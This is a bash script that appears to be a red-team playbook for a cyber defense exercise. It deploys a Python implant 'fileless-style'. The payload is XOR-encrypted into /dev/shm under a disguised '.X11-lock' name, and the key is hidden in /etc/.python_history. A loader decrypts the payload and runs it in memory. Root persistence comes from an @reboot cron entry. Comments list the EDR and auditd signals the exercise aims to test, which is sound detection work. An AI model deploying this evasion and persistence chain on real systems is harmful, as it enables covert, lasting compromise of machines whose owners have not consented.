#!/bin/bash
# lb2-sleep-crypt.sh -- SLEEP-CRYPTION IMPLANT playbook (Linux)
# Deploys sleep_crypt_implant.py fileless-style:
#   1. stage-2 source XOR-encrypted to a runtime-named blob under /dev/shm
#      (tmpfs = never touches disk; ciphertext in RAM only)
#   2. key stashed in an innocuous file under /etc
#   3. loader reconstructs the implant in memory (python exec) and the
#      implant then sleep-encrypts: mprotect RW<->RWX flips, madvise trim,
#      loopback-only beacon cadence
# EDR/auditd targets: execve of the loader, mmap RWX transitions, the
# periodic connect() cadence, plaintext signature strings ONLY while awake.
set -u
MARKER="ccdc-pb2"
DIR="$(cd "$(dirname "$0")" && pwd)"
LEDGER="$DIR/../ledger.jsonl"
BLOB="/dev/shm/.X11-lock-$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n')"
KEYFILE="/etc/.python_history"
PY="$(command -v python3 || command -v python)"

ledger() { printf '{"ts":"%s","playbook":"%s","step":"%s","artifact":"%s"}\n' \
    "$(date +%s)" "$MARKER" "$1" "$2" >> "$LEDGER"; }

[ -n "${PY:-}" ] || { echo "python3 required"; exit 1; }
[ "$(id -u)" -eq 0 ] || { echo "run as root"; exit 1; }

# ---- STEP 1: encrypt stage-2 into tmpfs -----------------------------------
KEY="$(head -c32 /dev/urandom | od -An -tx1 | tr -d ' \n')"
printf '%s\n' "$KEY" >> "$KEYFILE"
"$PY" - "$DIR/../sleep_crypt_implant.py" "$BLOB" "$KEY" <<'PYEOF'
import sys
src, blob, key = open(sys.argv[1], 'rb').read(), sys.argv[2], bytes.fromhex(sys.argv[3])
with open(blob, 'wb') as f:
    f.write(bytes(b ^ key[i % len(key)] for i, b in enumerate(src)))
PYEOF
ledger "encrypted-blob" "$BLOB"

# ---- STEP 2: loader (decrypt in memory, exec, no stage-2 on disk) ---------
LOADER=/dev/shm/.x-shm-$$
cat > "$LOADER" <<EOF
#!/bin/sh
exec "$PY" -c 'import sys
blob, key = open("$BLOB","rb").read(), bytes.fromhex(open("$KEYFILE").read().split()[-1])
exec(bytes(b ^ key[i % len(key)] for i, b in enumerate(blob)).decode())'
EOF
chmod 755 "$LOADER"
ledger "loader" "$LOADER"

# ---- STEP 3: persistence via @reboot cron + run NOW ------------------------
( crontab -l 2>/dev/null | grep -v "$LOADER"; echo "@reboot $LOADER # ccdc-pb2" ) | crontab -
ledger "cron-reboot" "crontab:root"
setsid "$LOADER" >/dev/null 2>&1 &
echo $! > /run/ccdc-pb2.pid
ledger "implant-process" "/proc/$(cat /run/ccdc-pb2.pid)/pid"

echo "== lb2 deployed: ciphertext blob $BLOB (tmpfs), key in $KEYFILE"
echo "== watch /proc/\$(pgrep -f X11-lock)/exe and auditd exec events"
echo "cleanup: sudo ./lcleanup.sh"
